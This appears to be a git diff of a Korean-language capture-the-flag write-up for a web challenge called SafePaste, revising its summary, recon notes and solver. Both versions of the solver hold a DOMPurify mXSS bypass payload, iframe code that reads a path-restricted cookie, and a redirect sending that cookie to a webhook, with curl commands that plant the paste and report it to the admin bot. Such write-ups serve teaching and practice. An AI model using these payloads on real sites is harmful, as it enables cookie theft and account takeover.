@@ -17,29 +17,23 @@ comments: false
 ---
 
 ## TL;DR
-
-1. `String.prototype.replace`의 `` $` `` (Dollar Backtick) 특수 패턴을 이용해 DOMPurify를 우회하는 mXSS를 발생시킴
-2. `path=/hidden`으로 제한된 FLAG 쿠키를 `iframe src="/hidden/x"`(존재하지 않는 경로)의 `contentDocument.cookie`로 읽어냄
-3. `encodeURIComponent`로 외부 webhook에 exfiltration
+1. **mXSS**: `isomorphic-dompurify`의 네임스페이스 뮤테이션 취약점(`<p id="$`...`)을 이용해 XSS를 트리거  
+2. **Socket Drop & Cookie Path Bypass**: `/hidden` 경로 직접 호출 시 발생하는 소켓 파괴(Socket Destroy) 방어 로직을 피하기 위해,  
+   하위 경로인 `/hidden/x` (404 Not Found)를 `iframe`으로 로드하여 `/hidden` 경로의 쿠키를 탈취   
+4. **Unicode Error Bypass**: 플래그에 포함된 이모지(🥀)로 인한 `btoa()` 인코딩 에러(`InvalidCharacterError`)를  
+   `encodeURIComponent()`를 사용하여 우회  
+6. **Domain Match**: 봇을 호출할 때 쿠키 도메인(`APP_HOST`) 조건에 맞추어 `localhost`가 아닌 실제 공인 IP를 타겟 URL로 전송  
 
 ---
 
 ## Overview
 
-SafePaste는 HTML을 허용하는 paste 공유 서비스입니다. DOMPurify로 서버사이드 sanitize를 수행하며,   
-관리자 봇이 신고된 URL을 방문합니다. FLAG는 관리자 봇의 `/hidden` 경로 전용 쿠키에 저장되어 있어,   
-XSS를 통해 쿠키를 훔치는 것이 목표입니다.
+**SafePaste**는 사용자의 입력을 DOMPurify로 검증한 후 저장하고,   
+관리자(Bot)에게 해당 URL을 신고(Report)하여 방문하게 만드는 전형적인 Client-Side (XSS) 웹 문제입니다.  
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│ 핵심 구성요소                                                │
-│                                                             │
-│  1. POST /create  → DOMPurify.sanitize() → 저장            │
-│  2. GET  /paste/:id → template.replace("{paste}", content) │
-│  3. POST /report  → 봇이 해당 URL 방문                     │
-│  4. GET  /hidden  → FLAG 쿠키 (path=/hidden 으로 제한)      │
-└─────────────────────────────────────────────────────────────┘
-```
+목표는 봇의 브라우저에 저장된 `FLAG` 쿠키를 탈취하는 것입니다.   
+하지만 쿠키는 `path: "/hidden"`, `domain: APP_HOST` 조건으로 엄격하게 구워져 있으며,   
+서버에는 최신 브라우저의 보안 정책과 교묘한 방어 로직(소켓 강제 종료 및 이모지 함정)들이 겹겹이 적용되어 있습니다.  
 
 ---
 
@@ -47,31 +41,17 @@ XSS를 통해 쿠키를 훔치는 것이 목표입니다.
 
 ### 1) Recon
 
-**server.ts** 분석:
-
-```typescript
-// 1. DOMPurify로 sanitize 후 저장
-const clean = DOMPurify.sanitize(content);
-pastes.set(id, clean);
-
-// 2. 단순 string replace로 HTML 템플릿에 삽입 ← 취약점!
-const html = pasteTemplate.replace("{paste}", content);
-
-// 3. FLAG 쿠키는 /hidden 경로에만 유효
-await page.setCookie({
-  name: "FLAG",
-  value: FLAG,
-  domain: APP_HOST,   // "localhost"
-  path: "/hidden",    // ← /paste/ 에서는 document.cookie로 접근 불가
-});
-
-// 4. CSP가 unsafe-inline 허용
-"script-src 'unsafe-inline' 'unsafe-eval'; ..."
-```
-
-- DOMPurify가 sanitize해도 template `replace` 단계에서 mXSS 가능
-- FLAG 쿠키의 `path=/hidden` 제한을 우회해야 함
-- CSP는 외부 도메인 fetch를 막지만 `document.location` redirect는 허용
+소스 코드에서 파악한 주요 엔드포인트와 방어 로직
+* **`/create` & `/paste/:id`**: 사용자의 입력을 받아 `isomorphic-dompurify`로 치환(Sanitize) 후 HTML로 렌더링합니다.  
+* **`/report`**: URL을 전달받아 관리자 봇(Puppeteer)을 호출합니다.  
+  이때 URL의 호스트네임이 `APP_HOST` 이거나 `localhost`여야만 통과시킵니다.  
+* **Bot Cookie**: 봇은 방문 전 플래그 쿠키를 `domain: APP_HOST`, `path: "/hidden"`으로 설정합니다.  
+* **`/hidden` 엔드포인트 방어 로직**:
+  ```typescript
+  app.get("/hidden", (req, res) => {
+    if (req.query.secret === ADMIN_SECRET) return res.send("Welcome, admin!");
+    res.socket?.destroy(); // 시크릿이 없으면 소켓을 강제로 끊어버림
+  });
 
 ---
 
@@ -235,65 +215,27 @@ curl -sX POST http://20.193.149.152:3000/report \
 
 ## Solver
 
-```bash
-#!/bin/bash
+```
+# 1. 공격 데이터를 받을 Webhook 주소 세팅
+WEBHOOK="webhook url" # 웹훅 url
+TARGET_IP="20.193.149.152"
 
-TARGET="${1:-http://20.193.149.152:3000}"
-WEBHOOK="${2:-https://your-webhook-url}"
-
-echo "[*] Target: $TARGET"
-echo "[*] Webhook: $WEBHOOK"
-
-# XSS payload: iframe /hidden/x → cookie exfil
-JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(function(){try{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);}catch(e){location.href='${WEBHOOK}?e='+encodeURIComponent(e.toString());}},2000);"
+# 2. XSS Payload (iframe 404 트릭 + encodeURIComponent 적용)
+JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(()=>{try{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);}catch(e){location.href='${WEBHOOK}?e='+encodeURIComponent(e.name);}}, 2000);"
 B64=$(echo -n "$JS" | base64 -w 0)
 
-echo "[*] Payload (base64): ${B64:0:50}..."
-
-# 1. 악성 paste 생성 ($` trick + DOMPurify bypass)
-PASTE_ID=$(curl -sX POST "${TARGET}/create" \
+# 3. DOMPurify mXSS를 이용한 악성 Paste 생성
+PASTE_ID=$(curl -sX POST http://$TARGET_IP:3000/create \
   --data-urlencode "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
-  -D - -o /dev/null | grep -i "^< location:" | tr -d '\r' | awk '{print $3}' | cut -d'/' -f3)
+  -D - -o /dev/null | grep -i location | tr -d '\r' | awk '{print $2}' | cut -d'/' -f3)
 
-if [ -z "$PASTE_ID" ]; then
-  echo "[!] Failed to create paste"
-  exit 1
-fi
+echo "생성된 Paste ID: $PASTE_ID"
 
-echo "[+] Created paste: $PASTE_ID"
-echo "[+] URL: ${TARGET}/paste/${PASTE_ID}"
-
-# 2. onerror payload 확인
-echo "[*] Verifying XSS payload..."
-VERIFY=$(curl -s "${TARGET}/paste/${PASTE_ID}" | grep -o "onerror[^>]*" | head -1)
-if [ -z "$VERIFY" ]; then
-  echo "[!] XSS payload not found in stored HTML"
-  exit 1
-fi
-echo "[+] XSS confirmed: ${VERIFY:0:60}..."
-
-# 3. 봇에게 신고
-echo "[*] Reporting to bot..."
-REPORT=$(curl -s -X POST "${TARGET}/report" \
-  --data-urlencode "url=${TARGET}/paste/${PASTE_ID}")
-echo "[+] Report response: $REPORT"
-
-echo ""
-echo "[*] Waiting for bot to visit (15 seconds)..."
-echo "[*] Check your webhook at: $WEBHOOK"
-sleep 15
-
-echo ""
-echo "[+] Done! Decode the flag:"
-echo "    python3 -c \"import urllib.parse; print(urllib.parse.unquote('FLAG_VALUE_FROM_WEBHOOK'))\""
+# 4. 봇에게 '공인 IP' 주소로 방문하라고 Report 전송 (APP_HOST 도메인 일치)
+curl -i -X POST http://$TARGET_IP:3000/report \
+  --data-urlencode "url=http://$TARGET_IP:3000/paste/$PASTE_ID"
 ```
 
----
-
-```bash
-python3 -c "import urllib.parse; print(urllib.parse.unquote('FLAG%3DBITSCTF%7B...%7D'))"
-# FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}
-```
 ---
 <img width="1706" height="550" alt="스크린샷 2026-02-22 062123" src="https://github.com/user-attachments/assets/618c879e-12fe-4745-87c0-2a9dcfa9af52" />
 <img width="1190" height="302" alt="스크린샷 2026-02-22 171852" src="https://github.com/user-attachments/assets/ac7e7406-2f3c-40e4-96d1-ef75bbfa9c55" />
